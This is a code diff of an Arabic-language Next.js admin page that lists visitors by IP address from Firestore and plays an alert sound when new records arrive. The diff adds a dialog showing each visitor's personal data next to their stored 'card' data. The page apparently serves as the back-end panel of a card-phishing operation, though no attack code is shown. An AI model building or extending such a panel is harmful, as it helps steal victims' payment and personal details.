@@ -23,16 +23,18 @@ import {
   updateDoc,
   query,
   onSnapshot,
+  getDoc,
 } from "firebase/firestore";
 import { onAuthStateChanged, signOut } from "firebase/auth";
 import { CardsByID } from "@/components/cards";
+import PersonalInfoDisplay from "@/components/personal";
 
 interface UserData {
   id: string;
   ip: string;
   country_name: string;
   city: string;
-  isp: string;
+  name: string;
   data?: any;
 }
 interface CardData {
@@ -62,6 +64,7 @@ export default function NotificationsPage() {
   );
   const [selectedUser, setSelectedUser] = useState<UserData | null>(null);
   const [showNotification, setShowNotification] = useState(false);
+
   const router = useRouter();
 
   const playNotificationSound = useCallback(() => {
@@ -84,9 +87,7 @@ export default function NotificationsPage() {
   const fetchUserData = async () => {
     setIsLoading(true);
     try {
-      const response = await fetch(
-        "https://api.ipify.org?format=json"
-      );
+      const response = await fetch("https://api.ipify.org?format=json");
       const result = await response.json();
       const _id = cleanString(result.ip);
 
@@ -108,6 +109,8 @@ export default function NotificationsPage() {
           }
         });
         setUserData(data);
+
+        console.log(data.at(0));
         if (data.length > userData.length) {
           playNotificationSound();
           setShowNotification(true);
@@ -240,9 +243,7 @@ export default function NotificationsPage() {
               <tr className="border-b border-gray-700">
                 <th className="px-4 py-3 text-right">المعرف</th>
                 <th className="px-4 py-3 text-right">عنوان IP</th>
-                <th className="px-4 py-3 text-right">الدولة</th>
-                <th className="px-4 py-3 text-right">المدينة</th>
-                <th className="px-4 py-3 text-right">مزود خدمة الإنترنت</th>
+                <th className="px-4 py-3 text-center"></th>
                 <th className="px-4 py-3 text-center">المعلومات</th>
                 <th className="px-4 py-3 text-center">حذف</th>
               </tr>
@@ -252,13 +253,11 @@ export default function NotificationsPage() {
                 <tr key={user.id} className="border-b border-gray-700">
                   <td className="px-4 py-3">{user.id}</td>
                   <td className="px-4 py-3">{user.ip}</td>
-                  <td className="px-4 py-3">{user.country_name}</td>
-                  <td className="px-4 py-3">{user.city}</td>
-                  <td className="px-4 py-3">{user.isp}</td>
+                  <td className="px-4 py-3"></td>
                   <td className="px-4 py-3">
                     <div className="flex flex-col sm:flex-row gap-2 justify-center">
                       <Badge
-                                           variant={
+                        variant={
                           user.data
                             ? cardData.some(
                                 (card: { id: string }) => card.id === user.id
@@ -267,7 +266,13 @@ export default function NotificationsPage() {
                               : "default"
                             : "destructive"
                         }
-
+                        className="rounded-md cursor-pointer"
+                        onClick={() => handleInfoClick(user, "card")}
+                      >
+                        {user.id ? "بطاقة" : "لا توجد بيانات"}
+                      </Badge>
+                      <Badge
+                        variant={haveInfo ? "destructive" : "outline"}
                         className="rounded-md cursor-pointer"
                         onClick={() => handleInfoClick(user, "personal")}
                       >
@@ -302,6 +307,22 @@ export default function NotificationsPage() {
             <div className="space-y-2">
               <pre className="whitespace-pre-wrap overflow-x-auto">
                 <CardsByID id={selectedUser.id} />
+              </pre>
+            </div>
+          )}
+        </DialogContent>
+      </Dialog>
+
+      <Dialog open={selectedInfo === "personal"} onOpenChange={closeDialog}>
+        <DialogContent className="bg-gray-800 text-white" dir="rtl">
+          <DialogHeader>
+            <DialogTitle>بيانات المستخدم</DialogTitle>
+            <DialogDescription>تفاصيل البيانات المخزنة</DialogDescription>
+          </DialogHeader>
+          {selectedUser && selectedUser.data && (
+            <div className="space-y-2">
+              <pre className="whitespace-pre-wrap overflow-x-auto">
+                <PersonalInfoDisplay id={selectedUser.id} />
               </pre>
             </div>
           )}
